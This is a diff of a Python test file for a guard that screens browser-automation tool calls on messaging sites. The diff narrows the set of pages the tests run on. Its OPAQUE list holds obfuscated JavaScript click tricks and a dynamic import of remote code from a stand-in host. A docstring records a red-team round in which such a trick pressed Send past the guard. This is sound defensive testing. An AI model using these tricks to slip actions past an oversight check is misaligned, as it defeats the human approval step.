@@ -130,6 +130,7 @@ def test_a_driven_browsers_navigate_to_a_javascript_address(tmp_path):
     assert guards.check("mcp__plugin_playwright_playwright__browser_navigate", {"url": "https://example.com/"}, CONFIG, session=session) is None
 
 
+RULE_2 = {k: v for k, v in PAGES.items() if k != "messenger"}  # a Messenger tab takes only the plugin's own (tests/test_batches.py)
 OPAQUE = [BUILT, "document.querySelector('b')?.['cli' + 'ck']?.()", "el[k]`x`", "(el['cli' + 'ck'])()", "Reflect.apply(f, el, [])",
           "f.apply(el, [])", "f.bind(el)()", "eval('el.click()')", "new Function('el.click()')()",
           "with (el) { click() }", "import('https://x.example/a.js')", "setTimeout('el.click()', 10)", "document.title + '",
@@ -145,7 +146,7 @@ READS = ["document.title", "[...document.querySelectorAll('h2')].map(h => h.inne
          "Array.from(document.querySelectorAll('a'), a => a.href).filter(h => h.includes('/messages/'))"]
 
 
-@pytest.mark.parametrize("site", sorted(PAGES))
+@pytest.mark.parametrize("site", sorted(RULE_2))
 @pytest.mark.parametrize("text", OPAQUE)
 def test_on_a_messaging_sites_page_a_script_that_calls_what_it_names_as_it_runs_is_refused(tmp_path, site, text):
     """Round 4, #3: `el['cli' + 'ck']()` clicked Send by a name no reading of the script's text shows. Read with its
@@ -156,7 +157,7 @@ def test_on_a_messaging_sites_page_a_script_that_calls_what_it_names_as_it_runs_
     assert _refused(verdict) and "cannot read" in verdict, (site, text, verdict)
 
 
-@pytest.mark.parametrize("site", sorted(PAGES))
+@pytest.mark.parametrize("site", sorted(RULE_2))
 @pytest.mark.parametrize("text", ACTS)
 def test_on_a_messaging_sites_page_a_script_that_acts_waits_for_the_code(tmp_path, site, text):
     session = _session(tmp_path, PAGES[site], tab=5)
@@ -164,7 +165,7 @@ def test_on_a_messaging_sites_page_a_script_that_acts_waits_for_the_code(tmp_pat
     assert verdict and "approve followed by the code" in verdict, (site, text, verdict)
 
 
-@pytest.mark.parametrize("site", sorted(PAGES))
+@pytest.mark.parametrize("site", sorted(RULE_2))
 @pytest.mark.parametrize("text", READS)
 def test_on_a_messaging_sites_page_a_plain_read_passes(tmp_path, site, text):
     session = _session(tmp_path, PAGES[site], tab=5)
